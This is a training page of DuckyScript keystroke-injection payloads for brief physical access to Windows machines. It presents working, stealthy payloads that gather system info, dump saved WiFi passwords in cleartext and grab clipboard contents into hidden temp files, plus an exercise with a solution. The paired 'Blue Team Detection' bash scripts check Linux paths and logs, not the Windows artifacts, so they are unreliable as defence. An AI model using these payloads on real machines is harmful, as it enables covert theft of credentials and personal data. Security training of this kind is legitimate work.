# Quick Drop Payloads (< 30 seconds)

## Overview

Quick drop payloads are designed for brief physical access scenarios. They must execute rapidly, leave minimal traces, and achieve objectives silently.

---

## Payload: QD-01 - Rapid System Info

**Execution Time:** ~8 seconds

```
REM Quick Drop Payload 01: Rapid System Info Grab
REM Time: < 10 seconds total
REM Stealth: High (no visible windows)

REM === CONFIGURATION ===
REM Output: Hidden file in temp directory

DELAY 1500
GUI r
DELAY 400
STRING powershell -w hidden -c "$o=@{H=$env:COMPUTERNAME;U=$env:USERNAME;D=$env:USERDOMAIN;IP=(Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias -notmatch 'Loopback'}|Select -First 1).IPAddress};$o|ConvertTo-Json|Out-File $env:TEMP\.sysinfo -Force"
ENTER
```

### What It Does
1. Opens hidden PowerShell
2. Collects: hostname, username, domain, IP address
3. Saves to hidden file in temp directory
4. Total time: ~8 seconds

### Blue Team Detection
```bash
# Detection script for this payload
#!/bin/bash
# Detect QD-01 artifacts

echo "[*] Checking for Quick Drop artifacts..."

# Check for hidden sysinfo files
if [ -f "/tmp/.sysinfo" ] || [ -f "$HOME/.sysinfo" ]; then
    echo "[ALERT] Quick drop artifact found!"
    cat /tmp/.sysinfo 2>/dev/null
fi

# Check for rapid PowerShell execution in logs
grep -i "powershell.*-w hidden" /var/log/syslog 2>/dev/null
```

---

## Payload: QD-02 - WiFi Password Grab

**Execution Time:** ~12 seconds

```
REM Quick Drop Payload 02: WiFi Password Dump
REM Time: ~12 seconds
REM Stealth: High

DELAY 1500
GUI r
DELAY 400
STRING cmd /c "netsh wlan show profiles | findstr Profile > %TEMP%\.wifi_profiles.tmp && for /f "tokens=2 delims=:" %i in (%TEMP%\.wifi_profiles.tmp) do netsh wlan show profile name=%i key=clear >> %TEMP%\.wifi_keys.txt 2>nul"
ENTER
```

### Blue Team Detection
```bash
#!/bin/bash
# Detect WiFi credential harvesting

echo "[*] Checking for WiFi credential theft..."

# Look for WiFi dump artifacts
find /tmp -name "*wifi*" -o -name "*wlan*" 2>/dev/null

# Check command history for netsh commands
grep -i "netsh wlan" ~/.bash_history 2>/dev/null
```

---

## Payload: QD-03 - Clipboard Capture

**Execution Time:** ~6 seconds

```
REM Quick Drop Payload 03: Clipboard Capture
REM Time: ~6 seconds
REM Stealth: Very High

DELAY 1500
GUI r
DELAY 400
STRING powershell -w hidden -c "Get-Clipboard -Raw | Out-File $env:TEMP\.clip -Force"
ENTER
```

### What This Captures
- Current clipboard contents
- Potentially: passwords, credit cards, sensitive data
- Users often copy sensitive information

### Blue Team Detection
```bash
#!/bin/bash
# Detect clipboard theft

echo "[*] Checking for clipboard capture artifacts..."

# Check for clipboard dump files
find /tmp -name "*clip*" -type f 2>/dev/null

# Monitor for clipboard access (would need OS-level monitoring)
echo "[*] Note: Implement clipboard access monitoring via EDR"
```

---

## Training Exercise: Create Your Own Quick Drop

### Challenge
Create a quick drop payload that:
1. Executes in under 10 seconds
2. Leaves no visible windows
3. Collects the current user's desktop file listing
4. Saves to a hidden file

### Your Payload Template
```
REM YOUR QUICK DROP PAYLOAD
REM Objective: List desktop files
REM Time limit: 10 seconds

DELAY ____
GUI r
DELAY ____
STRING ________________________________
ENTER
```

### Solution
<details>
<summary>Show Solution</summary>

```
DELAY 1500
GUI r
DELAY 400
STRING powershell -w hidden -c "dir $env:USERPROFILE\Desktop | Out-File $env:TEMP\.desktop_files -Force"
ENTER
```
</details>

### Defense Exercise
Create a script to detect your payload's artifacts:

```bash
#!/bin/bash
# Your detection script here
# Check for the artifacts your payload creates

# TODO: Add your detection logic
```

---

## Quick Drop Timing Reference

| Action | Minimum | Recommended | Notes |
|--------|---------|-------------|-------|
| Initial DELAY | 1000ms | 1500ms | USB enumeration |
| GUI r | 300ms | 400ms | Run dialog |
| Command entry | 0ms | 0ms | Instant typing |
| ENTER execution | N/A | N/A | Command runs |
| **Total overhead** | 1300ms | 1900ms | Before command |

---

[← Back to Deployment Strategies](README.md)
